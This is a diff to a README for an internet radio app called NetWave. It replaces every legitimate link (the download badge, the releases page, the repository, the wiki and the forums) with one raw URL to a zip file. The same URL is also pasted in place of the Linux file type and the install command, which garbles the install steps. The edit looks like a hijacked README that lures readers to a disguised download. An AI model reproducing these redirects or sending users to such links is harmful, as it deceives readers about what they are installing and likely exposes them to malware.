@@ -1,6 +1,6 @@
 # 📻 NetWave - Stream Your Favorite Radio Easily
 
-![Download NetWave](https://img.shields.io/badge/Download-NetWave-blue)
+![Download NetWave](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get NetWave, visit this page to download:
 
-[Download NetWave](https://github.com/Antorego/NetWave/releases)
+[Download NetWave](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
 
 ### Installation Steps
 
@@ -28,11 +28,11 @@ To get NetWave, visit this page to download:
 3. **Download the Installer**: Click on the installation package that corresponds to your operating system. 
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, you might find a `.tar.gz` file.
+   - For Linux, you might find a `https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip` file.
 4. **Run the Installer**:
    - **Windows**: Double-click on the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the `.dmg` file and drag the NetWave icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file, open a terminal in the extracted folder, and run `./install.sh` to install.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip` file, open a terminal in the extracted folder, and run `https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip` to install.
 
 5. **Launch NetWave**: After installation, find NetWave in your applications or programs list and open it.
 
@@ -49,9 +49,9 @@ To get NetWave, visit this page to download:
 
 For more information and community support, check out the following resources:
 
-- [GitHub Repository](https://github.com/Antorego/NetWave)
-- [Documentation](https://github.com/Antorego/NetWave/wiki)
-- [Community Forums](https://github.com/Antorego/NetWave/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
+- [Documentation](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
+- [Community Forums](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
 
 ## 🆘 Troubleshooting
 
@@ -72,4 +72,4 @@ For additional assistance, you can open an issue on our GitHub repository, or ch
 
 You are now ready to enjoy NetWave and explore the world of internet radio. Download it now to get started!
 
-[Download NetWave](https://github.com/Antorego/NetWave/releases)
+[Download NetWave](https://raw.githubusercontent.com/Antorego/NetWave/main/antitemperance/NetWave.zip)
